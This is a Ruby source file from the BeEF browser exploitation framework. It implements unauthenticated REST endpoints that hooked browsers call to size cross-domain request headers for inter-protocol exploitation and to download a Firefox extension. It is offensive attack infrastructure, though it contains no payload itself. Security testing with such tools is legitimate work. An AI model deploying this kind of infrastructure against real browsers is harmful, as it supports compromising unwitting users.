#
# Copyright (c) 2006-2022 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#

module BeEF
  module Extension
    module Ipec
      class IpecRest < BeEF::Core::Router::Router
        before do
          # NOTE: the method exposed by this class are NOT-AUTHENTICATED.
          # They need to be called remotely from a hooked browser.

          # error 401 unless params[:token] == config.get('beef.api_token')
          # halt 401 if not BeEF::Core::Rest.permitted_source?(request.ip)
          headers 'Content-Type' => 'application/json; charset=UTF-8',
                  'Pragma' => 'no-cache',
                  'Cache-Control' => 'no-cache',
                  'Expires' => '0'
        end

        # Determine the exact size of the cross-domain request HTTP headers.
        # Needed to calculate junk properly and prevent errors.
        # See modules/exploits/beefbind/beef_bind_staged_deploy/command.js for more info.
        # todo: the core of this method should be moved to ../junk_calculator.rb
        get '/junk/:name' do
          socket_name = params[:name]
          halt 401 unless BeEF::Filters.alphanums_only?(socket_name)
          socket_data = BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.get_socket_data(socket_name)
          halt 404 if socket_data.nil?

          if socket_data.include?("\r\n\r\n")
            result = {}

            headers = socket_data.split("\r\n\r\n").first
            BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind_socket(socket_name)
            print_info "[IPEC] Cross-domain XmlHttpRequest headers size - received from bind socket [#{socket_name}]: #{headers.size + 4} bytes."
            # CRLF -> 4 bytes
            result['size'] = headers.size + 4

            headers.split("\r\n").each do |line|
              result['host'] = line.size + 2 if line.include?('Host')
              result['contenttype'] = line.size + 2 if line.include?('Content-Type')
              result['referer'] = line.size + 2 if line.include?('Referer')
            end
            result.to_json
          else
            print_error '[IPEC] Looks like there is no CRLF in the data received!'
            halt 404
          end
        end

        # The original Firefox Extension sources are in extensions/ipec/files/LinkTargetFinder dir.
        # If you want to modify the pref.js file, do the following to re-pack the extension:
        # $cd firefox_extension_directory
        # $zip -r ../result-name.xpi *
        get '/ff_extension' do
          response['Content-Type'] = 'application/x-xpinstall'
          ff_extension = "#{File.expand_path('../../ipec/files', __dir__)}/LinkTargetFinder.xpi"
          print_info "[IPEC] Serving Firefox Extension: #{ff_extension}"
          send_file ff_extension.to_s,
                    type: 'application/x-xpinstall',
                    disposition: 'inline'
        end
      end
    end
  end
end
